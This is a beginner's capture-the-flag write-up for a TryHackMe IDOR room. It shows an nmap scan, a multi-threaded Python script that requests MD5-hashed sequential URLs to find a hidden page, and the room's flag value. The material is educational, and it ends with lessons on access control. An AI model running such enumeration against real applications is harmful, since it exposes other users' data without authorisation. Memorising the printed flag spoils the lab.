---

# TryHackMe: Corridor — IDOR via Custom Python Automation

> **Room:** [Corridor](https://tryhackme.com/room/corridor)  
> **Difficulty:** Easy  
> **Category:** Web / IDOR  
> **Tools:** nmap, Python, requests, hashlib, concurrent.futures

---

## 🚩 FLAG

| Flag | Value |
|------|-------|
| **Flag** | `flag{2477ef02448ad9156661ac40a6b8862e}` |

---

## Reconnaissance

Always do reconnaissance before hacking anything. Understanding the system is priority number one. That's why we start with NMAP:

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

**Results:**

| PORT | STATE | SERVICE | VERSION |
|------|-------|---------|---------|
| 80/tcp | open | http | Werkzeug/Flask |

Only port 80 is open — Flask server. Nothing else to enumerate.

---

## Web Application Analysis

We navigate to `http://<TARGET_IP>/` and see multiple doors in a corridor image. Clicking any door — barely noticeable — changes the URL to:

```
http://<TARGET_IP>/c4ca4238a0b923820dcc509a6f75849b

```

Checking the frontend reveals nothing useful, so we look at the **backend** (`Ctrl+U`). Found 13 `<area>` tags containing 32-character hex hashes. Immediately recognized the pattern as **MD5**.

```html
<area shape="rect" coords="..." href="c4ca4238a0b923820dcc509a6f75849b">
```

---

## Automation: Python Script

Normal people do this in terminal, but we use Python because why not? Having fun is not a crime :D

**Why Python?** Manual testing can be useful sometimes, but software built to save time is powerful 💪. There are 13 visible doors, and testing boundary conditions (0, negatives, higher numbers) one by one is slow. A Python script tests all possibilities in seconds. Plus, we add multi-threading with `concurrent.futures` to multiply the speed.

```python
import hashlib
import requests
import concurrent.futures

TARGET = "http://<TARGET_IP>"
START = 0
END = 50
THREADS = 10
TIMEOUT = 5

session = requests.Session()

def check(i):
    try:
        hash_val = hashlib.md5(str(i).encode()).hexdigest()
        url = f"{TARGET}/{hash_val}"
        r = session.get(url, timeout=TIMEOUT)

        if r.status_code == 200 and "flag" in r.text.lower():
            return i, url, r.text[:300]  # output limit
    except requests.RequestException:
        return None

with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
    futures = [executor.submit(check, i) for i in range(START, END)]

    for f in concurrent.futures.as_completed(futures):
        result = f.result()
        if result:
            i, url, content = result
            print(f"[+] FLAG FOUND at index {i}")
            print(f"[+] URL: {url}")
            print(content)
            executor.shutdown(wait=False, cancel_futures=True)
            break
```

---

## Exploitation

Run the script:

```bash
python3 corridor_exploit.py
```

**Output:**
```
[+] FLAG FOUND at index 0
[+] URL: http://<TARGET_IP>/cfcd208495d565ef66e7dff9f98764da
```

Hmm... **Room 0** existed but was hidden from the frontend. Classic **"off-by-one"** developer mistake + **IDOR** vulnerability.

---

## What is IDOR?

**Insecure Direct Object Reference (IDOR)** — occurs when an application exposes a reference to an internal implementation object (database key, file, directory path) without proper access control. Attackers can manipulate these references to access unauthorized data.

In this room:
- **Direct Reference:** MD5 hash of room number
- **Predictable Pattern:** `MD5(number)` format
- **Missing Access Control:** Room 0 is hidden in frontend but accessible in backend
- **Security Through Obscurity:** Hashing doesn't provide real protection

---

## Lessons Learned

| Key Point | Why It Matters |
|-----------|--------------|
| Automate enumeration | Manual testing misses edge cases |
| Test boundary conditions | Values like 0 are often forgotten by developers |
| Hash ≠ security | MD5 hashes generated from sequential numbers are easily guessable |
| Inspect page source | Frontend hides, source code reveals the truth |
| Use multi-threading | Speed up, time is valuable |

---

happy hacking! ( its my 6rd writeup Im just a beginner )
